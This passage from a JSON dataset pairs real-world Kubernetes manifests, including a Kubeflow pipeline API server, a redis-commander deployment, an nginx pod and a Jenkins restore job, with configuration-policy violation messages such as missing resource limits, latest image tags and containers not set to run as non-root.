    "violation_text": "The container \"main\" is using an invalid container image, \"luksa/batch-job\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "1996",
    "manifest_path": "data/manifests/the_stack_sample/sample_0468.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: batch-job-every-fifteen-minutes\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: periodic-batch-job\n      spec:\n        containers:\n        - name: main\n          image: luksa/batch-job\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"main\" does not have a read-only root file system"
  },
  {
    "id": "1997",
    "manifest_path": "data/manifests/the_stack_sample/sample_0468.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: batch-job-every-fifteen-minutes\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: periodic-batch-job\n      spec:\n        containers:\n        - name: main\n          image: luksa/batch-job\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"main\" is not set to runAsNonRoot"
  },
  {
    "id": "1998",
    "manifest_path": "data/manifests/the_stack_sample/sample_0468.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: batch-job-every-fifteen-minutes\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: periodic-batch-job\n      spec:\n        containers:\n        - name: main\n          image: luksa/batch-job\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"main\" has cpu request 0"
  },
  {
    "id": "1999",
    "manifest_path": "data/manifests/the_stack_sample/sample_0468.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: batch-job-every-fifteen-minutes\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: periodic-batch-job\n      spec:\n        containers:\n        - name: main\n          image: luksa/batch-job\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"main\" has memory limit 0"
  },
  {
    "id": "2000",
    "manifest_path": "data/manifests/the_stack_sample/sample_0469.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: ml-pipeline\n    app.kubernetes.io/component: ml-pipeline\n    app.kubernetes.io/name: kubeflow-pipelines\n  name: ml-pipeline\n  namespace: kubeflow\nspec:\n  selector:\n    matchLabels:\n      app: ml-pipeline\n      app.kubernetes.io/component: ml-pipeline\n      app.kubernetes.io/name: kubeflow-pipelines\n  template:\n    metadata:\n      labels:\n        app: ml-pipeline\n        app.kubernetes.io/component: ml-pipeline\n        app.kubernetes.io/name: kubeflow-pipelines\n    spec:\n      containers:\n      - env:\n        - name: KUBEFLOW_USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config-bk4bc7m928\n        - name: KUBEFLOW_USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config-bk4bc7m928\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: OBJECTSTORECONFIG_SECURE\n          value: 'false'\n        - name: OBJECTSTORECONFIG_BUCKETNAME\n          valueFrom:\n            configMapKeyRef:\n              key: bucketName\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_USER\n          valueFrom:\n            secretKeyRef:\n              key: username\n              name: mysql-secret-fd5gktm75t\n        - name: DBCONFIG_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: password\n              name: mysql-secret-fd5gktm75t\n        - name: DBCONFIG_DBNAME\n          valueFrom:\n            configMapKeyRef:\n              key: pipelineDb\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_HOST\n          valueFrom:\n            configMapKeyRef:\n              key: dbHost\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_PORT\n          valueFrom:\n            configMapKeyRef:\n              key: dbPort\n              name: pipeline-install-config-2829cc67f8\n        - name: OBJECTSTORECONFIG_ACCESSKEY\n          valueFrom:\n            secretKeyRef:\n              key: accesskey\n              name: mlpipeline-minio-artifact\n        - name: OBJECTSTORECONFIG_SECRETACCESSKEY\n          valueFrom:\n            secretKeyRef:\n              key: secretkey\n              name: mlpipeline-minio-artifact\n        envFrom:\n        - configMapRef:\n            name: pipeline-api-server-config-f4t72426kt\n        image: uhub.service.ucloud.cn/a4x-kubeflow/ml-pipeline/api-server:1.0.4\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          exec:\n            command:\n            - wget\n            - -q\n            - -S\n            - -O\n            - '-'\n            - http://localhost:8888/apis/v1beta1/healthz\n          initialDelaySeconds: 3\n          periodSeconds: 5\n          timeoutSeconds: 2\n        name: ml-pipeline-api-server\n        ports:\n        - containerPort: 8888\n          name: http\n        - containerPort: 8887\n          name: grpc\n        readinessProbe:\n          exec:\n            command:\n            - wget\n            - -q\n            - -S\n            - -O\n            - '-'\n            - http://localhost:8888/apis/v1beta1/healthz\n          initialDelaySeconds: 3\n          periodSeconds: 5\n          timeoutSeconds: 2\n      serviceAccountName: ml-pipeline\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ml-pipeline-api-server\" does not have a read-only root file system"
  },
  {
    "id": "2001",
    "manifest_path": "data/manifests/the_stack_sample/sample_0469.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: ml-pipeline\n    app.kubernetes.io/component: ml-pipeline\n    app.kubernetes.io/name: kubeflow-pipelines\n  name: ml-pipeline\n  namespace: kubeflow\nspec:\n  selector:\n    matchLabels:\n      app: ml-pipeline\n      app.kubernetes.io/component: ml-pipeline\n      app.kubernetes.io/name: kubeflow-pipelines\n  template:\n    metadata:\n      labels:\n        app: ml-pipeline\n        app.kubernetes.io/component: ml-pipeline\n        app.kubernetes.io/name: kubeflow-pipelines\n    spec:\n      containers:\n      - env:\n        - name: KUBEFLOW_USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config-bk4bc7m928\n        - name: KUBEFLOW_USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config-bk4bc7m928\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: OBJECTSTORECONFIG_SECURE\n          value: 'false'\n        - name: OBJECTSTORECONFIG_BUCKETNAME\n          valueFrom:\n            configMapKeyRef:\n              key: bucketName\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_USER\n          valueFrom:\n            secretKeyRef:\n              key: username\n              name: mysql-secret-fd5gktm75t\n        - name: DBCONFIG_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: password\n              name: mysql-secret-fd5gktm75t\n        - name: DBCONFIG_DBNAME\n          valueFrom:\n            configMapKeyRef:\n              key: pipelineDb\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_HOST\n          valueFrom:\n            configMapKeyRef:\n              key: dbHost\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_PORT\n          valueFrom:\n            configMapKeyRef:\n              key: dbPort\n              name: pipeline-install-config-2829cc67f8\n        - name: OBJECTSTORECONFIG_ACCESSKEY\n          valueFrom:\n            secretKeyRef:\n              key: accesskey\n              name: mlpipeline-minio-artifact\n        - name: OBJECTSTORECONFIG_SECRETACCESSKEY\n          valueFrom:\n            secretKeyRef:\n              key: secretkey\n              name: mlpipeline-minio-artifact\n        envFrom:\n        - configMapRef:\n            name: pipeline-api-server-config-f4t72426kt\n        image: uhub.service.ucloud.cn/a4x-kubeflow/ml-pipeline/api-server:1.0.4\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          exec:\n            command:\n            - wget\n            - -q\n            - -S\n            - -O\n            - '-'\n            - http://localhost:8888/apis/v1beta1/healthz\n          initialDelaySeconds: 3\n          periodSeconds: 5\n          timeoutSeconds: 2\n        name: ml-pipeline-api-server\n        ports:\n        - containerPort: 8888\n          name: http\n        - containerPort: 8887\n          name: grpc\n        readinessProbe:\n          exec:\n            command:\n            - wget\n            - -q\n            - -S\n            - -O\n            - '-'\n            - http://localhost:8888/apis/v1beta1/healthz\n          initialDelaySeconds: 3\n          periodSeconds: 5\n          timeoutSeconds: 2\n      serviceAccountName: ml-pipeline\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"ml-pipeline\" not found"
  },
  {
    "id": "2002",
    "manifest_path": "data/manifests/the_stack_sample/sample_0469.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: ml-pipeline\n    app.kubernetes.io/component: ml-pipeline\n    app.kubernetes.io/name: kubeflow-pipelines\n  name: ml-pipeline\n  namespace: kubeflow\nspec:\n  selector:\n    matchLabels:\n      app: ml-pipeline\n      app.kubernetes.io/component: ml-pipeline\n      app.kubernetes.io/name: kubeflow-pipelines\n  template:\n    metadata:\n      labels:\n        app: ml-pipeline\n        app.kubernetes.io/component: ml-pipeline\n        app.kubernetes.io/name: kubeflow-pipelines\n    spec:\n      containers:\n      - env:\n        - name: KUBEFLOW_USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config-bk4bc7m928\n        - name: KUBEFLOW_USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config-bk4bc7m928\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: OBJECTSTORECONFIG_SECURE\n          value: 'false'\n        - name: OBJECTSTORECONFIG_BUCKETNAME\n          valueFrom:\n            configMapKeyRef:\n              key: bucketName\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_USER\n          valueFrom:\n            secretKeyRef:\n              key: username\n              name: mysql-secret-fd5gktm75t\n        - name: DBCONFIG_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: password\n              name: mysql-secret-fd5gktm75t\n        - name: DBCONFIG_DBNAME\n          valueFrom:\n            configMapKeyRef:\n              key: pipelineDb\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_HOST\n          valueFrom:\n            configMapKeyRef:\n              key: dbHost\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_PORT\n          valueFrom:\n            configMapKeyRef:\n              key: dbPort\n              name: pipeline-install-config-2829cc67f8\n        - name: OBJECTSTORECONFIG_ACCESSKEY\n          valueFrom:\n            secretKeyRef:\n              key: accesskey\n              name: mlpipeline-minio-artifact\n        - name: OBJECTSTORECONFIG_SECRETACCESSKEY\n          valueFrom:\n            secretKeyRef:\n              key: secretkey\n              name: mlpipeline-minio-artifact\n        envFrom:\n        - configMapRef:\n            name: pipeline-api-server-config-f4t72426kt\n        image: uhub.service.ucloud.cn/a4x-kubeflow/ml-pipeline/api-server:1.0.4\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          exec:\n            command:\n            - wget\n            - -q\n            - -S\n            - -O\n            - '-'\n            - http://localhost:8888/apis/v1beta1/healthz\n          initialDelaySeconds: 3\n          periodSeconds: 5\n          timeoutSeconds: 2\n        name: ml-pipeline-api-server\n        ports:\n        - containerPort: 8888\n          name: http\n        - containerPort: 8887\n          name: grpc\n        readinessProbe:\n          exec:\n            command:\n            - wget\n            - -q\n            - -S\n            - -O\n            - '-'\n            - http://localhost:8888/apis/v1beta1/healthz\n          initialDelaySeconds: 3\n          periodSeconds: 5\n          timeoutSeconds: 2\n      serviceAccountName: ml-pipeline\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ml-pipeline-api-server\" is not set to runAsNonRoot"
  },
  {
    "id": "2003",
    "manifest_path": "data/manifests/the_stack_sample/sample_0469.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: ml-pipeline\n    app.kubernetes.io/component: ml-pipeline\n    app.kubernetes.io/name: kubeflow-pipelines\n  name: ml-pipeline\n  namespace: kubeflow\nspec:\n  selector:\n    matchLabels:\n      app: ml-pipeline\n      app.kubernetes.io/component: ml-pipeline\n      app.kubernetes.io/name: kubeflow-pipelines\n  template:\n    metadata:\n      labels:\n        app: ml-pipeline\n        app.kubernetes.io/component: ml-pipeline\n        app.kubernetes.io/name: kubeflow-pipelines\n    spec:\n      containers:\n      - env:\n        - name: KUBEFLOW_USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config-bk4bc7m928\n        - name: KUBEFLOW_USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config-bk4bc7m928\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: OBJECTSTORECONFIG_SECURE\n          value: 'false'\n        - name: OBJECTSTORECONFIG_BUCKETNAME\n          valueFrom:\n            configMapKeyRef:\n              key: bucketName\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_USER\n          valueFrom:\n            secretKeyRef:\n              key: username\n              name: mysql-secret-fd5gktm75t\n        - name: DBCONFIG_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: password\n              name: mysql-secret-fd5gktm75t\n        - name: DBCONFIG_DBNAME\n          valueFrom:\n            configMapKeyRef:\n              key: pipelineDb\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_HOST\n          valueFrom:\n            configMapKeyRef:\n              key: dbHost\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_PORT\n          valueFrom:\n            configMapKeyRef:\n              key: dbPort\n              name: pipeline-install-config-2829cc67f8\n        - name: OBJECTSTORECONFIG_ACCESSKEY\n          valueFrom:\n            secretKeyRef:\n              key: accesskey\n              name: mlpipeline-minio-artifact\n        - name: OBJECTSTORECONFIG_SECRETACCESSKEY\n          valueFrom:\n            secretKeyRef:\n              key: secretkey\n              name: mlpipeline-minio-artifact\n        envFrom:\n        - configMapRef:\n            name: pipeline-api-server-config-f4t72426kt\n        image: uhub.service.ucloud.cn/a4x-kubeflow/ml-pipeline/api-server:1.0.4\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          exec:\n            command:\n            - wget\n            - -q\n            - -S\n            - -O\n            - '-'\n            - http://localhost:8888/apis/v1beta1/healthz\n          initialDelaySeconds: 3\n          periodSeconds: 5\n          timeoutSeconds: 2\n        name: ml-pipeline-api-server\n        ports:\n        - containerPort: 8888\n          name: http\n        - containerPort: 8887\n          name: grpc\n        readinessProbe:\n          exec:\n            command:\n            - wget\n            - -q\n            - -S\n            - -O\n            - '-'\n            - http://localhost:8888/apis/v1beta1/healthz\n          initialDelaySeconds: 3\n          periodSeconds: 5\n          timeoutSeconds: 2\n      serviceAccountName: ml-pipeline\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ml-pipeline-api-server\" has cpu request 0"
  },
  {
    "id": "2004",
    "manifest_path": "data/manifests/the_stack_sample/sample_0469.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: ml-pipeline\n    app.kubernetes.io/component: ml-pipeline\n    app.kubernetes.io/name: kubeflow-pipelines\n  name: ml-pipeline\n  namespace: kubeflow\nspec:\n  selector:\n    matchLabels:\n      app: ml-pipeline\n      app.kubernetes.io/component: ml-pipeline\n      app.kubernetes.io/name: kubeflow-pipelines\n  template:\n    metadata:\n      labels:\n        app: ml-pipeline\n        app.kubernetes.io/component: ml-pipeline\n        app.kubernetes.io/name: kubeflow-pipelines\n    spec:\n      containers:\n      - env:\n        - name: KUBEFLOW_USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config-bk4bc7m928\n        - name: KUBEFLOW_USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config-bk4bc7m928\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: OBJECTSTORECONFIG_SECURE\n          value: 'false'\n        - name: OBJECTSTORECONFIG_BUCKETNAME\n          valueFrom:\n            configMapKeyRef:\n              key: bucketName\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_USER\n          valueFrom:\n            secretKeyRef:\n              key: username\n              name: mysql-secret-fd5gktm75t\n        - name: DBCONFIG_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: password\n              name: mysql-secret-fd5gktm75t\n        - name: DBCONFIG_DBNAME\n          valueFrom:\n            configMapKeyRef:\n              key: pipelineDb\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_HOST\n          valueFrom:\n            configMapKeyRef:\n              key: dbHost\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_PORT\n          valueFrom:\n            configMapKeyRef:\n              key: dbPort\n              name: pipeline-install-config-2829cc67f8\n        - name: OBJECTSTORECONFIG_ACCESSKEY\n          valueFrom:\n            secretKeyRef:\n              key: accesskey\n              name: mlpipeline-minio-artifact\n        - name: OBJECTSTORECONFIG_SECRETACCESSKEY\n          valueFrom:\n            secretKeyRef:\n              key: secretkey\n              name: mlpipeline-minio-artifact\n        envFrom:\n        - configMapRef:\n            name: pipeline-api-server-config-f4t72426kt\n        image: uhub.service.ucloud.cn/a4x-kubeflow/ml-pipeline/api-server:1.0.4\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          exec:\n            command:\n            - wget\n            - -q\n            - -S\n            - -O\n            - '-'\n            - http://localhost:8888/apis/v1beta1/healthz\n          initialDelaySeconds: 3\n          periodSeconds: 5\n          timeoutSeconds: 2\n        name: ml-pipeline-api-server\n        ports:\n        - containerPort: 8888\n          name: http\n        - containerPort: 8887\n          name: grpc\n        readinessProbe:\n          exec:\n            command:\n            - wget\n            - -q\n            - -S\n            - -O\n            - '-'\n            - http://localhost:8888/apis/v1beta1/healthz\n          initialDelaySeconds: 3\n          periodSeconds: 5\n          timeoutSeconds: 2\n      serviceAccountName: ml-pipeline\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ml-pipeline-api-server\" has memory limit 0"
  },
  {
    "id": "2005",
    "manifest_path": "data/manifests/the_stack_sample/sample_0470.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis-commander\n  annotations:\n    container.apparmor.security.beta.kubernetes.io/redis-commander: runtime/default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: redis-commander\n  template:\n    metadata:\n      labels:\n        app: redis-commander\n        tier: backend\n    spec:\n      containers:\n      - name: redis-commander\n        image: rediscommander/redis-commander\n        imagePullPolicy: Always\n        env:\n        - name: REDIS_HOSTS\n          value: instance1:redis:6379\n        - name: K8S_SIGTERM\n          value: '1'\n        ports:\n        - name: redis-commander\n          containerPort: 8081\n        livenessProbe:\n          httpGet:\n            path: /favicon.png\n            port: 8081\n          initialDelaySeconds: 10\n          timeoutSeconds: 5\n        securityContext:\n          runAsNonRoot: true\n          readOnlyRootFilesystem: false\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"redis-commander\" is using an invalid container image, \"rediscommander/redis-commander\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2006",
    "manifest_path": "data/manifests/the_stack_sample/sample_0470.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis-commander\n  annotations:\n    container.apparmor.security.beta.kubernetes.io/redis-commander: runtime/default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: redis-commander\n  template:\n    metadata:\n      labels:\n        app: redis-commander\n        tier: backend\n    spec:\n      containers:\n      - name: redis-commander\n        image: rediscommander/redis-commander\n        imagePullPolicy: Always\n        env:\n        - name: REDIS_HOSTS\n          value: instance1:redis:6379\n        - name: K8S_SIGTERM\n          value: '1'\n        ports:\n        - name: redis-commander\n          containerPort: 8081\n        livenessProbe:\n          httpGet:\n            path: /favicon.png\n            port: 8081\n          initialDelaySeconds: 10\n          timeoutSeconds: 5\n        securityContext:\n          runAsNonRoot: true\n          readOnlyRootFilesystem: false\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"redis-commander\" does not have a read-only root file system"
  },
  {
    "id": "2007",
    "manifest_path": "data/manifests/the_stack_sample/sample_0470.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis-commander\n  annotations:\n    container.apparmor.security.beta.kubernetes.io/redis-commander: runtime/default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: redis-commander\n  template:\n    metadata:\n      labels:\n        app: redis-commander\n        tier: backend\n    spec:\n      containers:\n      - name: redis-commander\n        image: rediscommander/redis-commander\n        imagePullPolicy: Always\n        env:\n        - name: REDIS_HOSTS\n          value: instance1:redis:6379\n        - name: K8S_SIGTERM\n          value: '1'\n        ports:\n        - name: redis-commander\n          containerPort: 8081\n        livenessProbe:\n          httpGet:\n            path: /favicon.png\n            port: 8081\n          initialDelaySeconds: 10\n          timeoutSeconds: 5\n        securityContext:\n          runAsNonRoot: true\n          readOnlyRootFilesystem: false\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"redis-commander\" has cpu request 0"
  },
  {
    "id": "2008",
    "manifest_path": "data/manifests/the_stack_sample/sample_0470.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis-commander\n  annotations:\n    container.apparmor.security.beta.kubernetes.io/redis-commander: runtime/default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: redis-commander\n  template:\n    metadata:\n      labels:\n        app: redis-commander\n        tier: backend\n    spec:\n      containers:\n      - name: redis-commander\n        image: rediscommander/redis-commander\n        imagePullPolicy: Always\n        env:\n        - name: REDIS_HOSTS\n          value: instance1:redis:6379\n        - name: K8S_SIGTERM\n          value: '1'\n        ports:\n        - name: redis-commander\n          containerPort: 8081\n        livenessProbe:\n          httpGet:\n            path: /favicon.png\n            port: 8081\n          initialDelaySeconds: 10\n          timeoutSeconds: 5\n        securityContext:\n          runAsNonRoot: true\n          readOnlyRootFilesystem: false\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"redis-commander\" has memory limit 0"
  },
  {
    "id": "2009",
    "manifest_path": "data/manifests/the_stack_sample/sample_0471.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9833\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2010",
    "manifest_path": "data/manifests/the_stack_sample/sample_0471.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9833\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "2011",
    "manifest_path": "data/manifests/the_stack_sample/sample_0471.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9833\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "2012",
    "manifest_path": "data/manifests/the_stack_sample/sample_0471.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9833\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "2013",
    "manifest_path": "data/manifests/the_stack_sample/sample_0471.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9833\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "2014",
    "manifest_path": "data/manifests/the_stack_sample/sample_0473.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hello\nspec:\n  containers:\n  - image: felipeogutierrez/explore-akka:1.1\n    name: hello\n    imagePullPolicy: Always\n    args:\n    - '83.1'\n    ports:\n    - containerPort: 8001\n      name: http\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hello\" does not have a read-only root file system"
  },
  {
    "id": "2015",
    "manifest_path": "data/manifests/the_stack_sample/sample_0473.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hello\nspec:\n  containers:\n  - image: felipeogutierrez/explore-akka:1.1\n    name: hello\n    imagePullPolicy: Always\n    args:\n    - '83.1'\n    ports:\n    - containerPort: 8001\n      name: http\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hello\" is not set to runAsNonRoot"
  },
  {
    "id": "2016",
    "manifest_path": "data/manifests/the_stack_sample/sample_0473.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hello\nspec:\n  containers:\n  - image: felipeogutierrez/explore-akka:1.1\n    name: hello\n    imagePullPolicy: Always\n    args:\n    - '83.1'\n    ports:\n    - containerPort: 8001\n      name: http\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"hello\" has cpu request 0"
  },
  {
    "id": "2017",
    "manifest_path": "data/manifests/the_stack_sample/sample_0473.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hello\nspec:\n  containers:\n  - image: felipeogutierrez/explore-akka:1.1\n    name: hello\n    imagePullPolicy: Always\n    args:\n    - '83.1'\n    ports:\n    - containerPort: 8001\n      name: http\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"hello\" has memory limit 0"
  },
  {
    "id": "2018",
    "manifest_path": "data/manifests/the_stack_sample/sample_0474.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: restore-jenkins\nspec:\n  template:\n    spec:\n      containers:\n      - name: download-dataset\n        image: google/cloud-sdk:latest\n        imagePullPolicy: Always\n        volumeMounts:\n        - mountPath: /certs\n          name: gcloud-certs\n          readOnly: true\n        - mountPath: /transfer\n          name: transfer\n        command:\n        - sh\n        - -c\n        - 'gcloud auth activate-service-account --key-file=/certs/svc_account.json\n\n\n          gsutil cp \"<JENKINS_BACKUP_BUCKET>/jenkins.tar.gz\" /transfer/jenkins.tar.gz\n\n          cd /transfer\n\n          tar -xzvf jenkins.tar.gz\n\n          rm jenkins.tar.gz\n\n          cd jenkins_home\n\n          find . -maxdepth 1 -exec mv {} .. \\;\n\n          cd ..\n\n          rm -rf jenkins_home\n\n          '\n      volumes:\n      - name: gcloud-certs\n        secret:\n          secretName: gcloud-creds\n      - name: transfer\n        persistentVolumeClaim:\n          claimName: <EXISTING_CLAIM>\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "2019",
    "manifest_path": "data/manifests/the_stack_sample/sample_0474.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: restore-jenkins\nspec:\n  template:\n    spec:\n      containers:\n      - name: download-dataset\n        image: google/cloud-sdk:latest\n        imagePullPolicy: Always\n        volumeMounts:\n        - mountPath: /certs\n          name: gcloud-certs\n          readOnly: true\n        - mountPath: /transfer\n          name: transfer\n        command:\n        - sh\n        - -c\n        - 'gcloud auth activate-service-account --key-file=/certs/svc_account.json\n\n\n          gsutil cp \"<JENKINS_BACKUP_BUCKET>/jenkins.tar.gz\" /transfer/jenkins.tar.gz\n\n          cd /transfer\n\n          tar -xzvf jenkins.tar.gz\n\n          rm jenkins.tar.gz\n\n          cd jenkins_home\n\n          find . -maxdepth 1 -exec mv {} .. \\;\n\n          cd ..\n\n          rm -rf jenkins_home\n\n          '\n      volumes:\n      - name: gcloud-certs\n        secret:\n          secretName: gcloud-creds\n      - name: transfer\n        persistentVolumeClaim:\n          claimName: <EXISTING_CLAIM>\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"download-dataset\" is using an invalid container image, \"google/cloud-sdk:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2020",
    "manifest_path": "data/manifests/the_stack_sample/sample_0474.yaml",
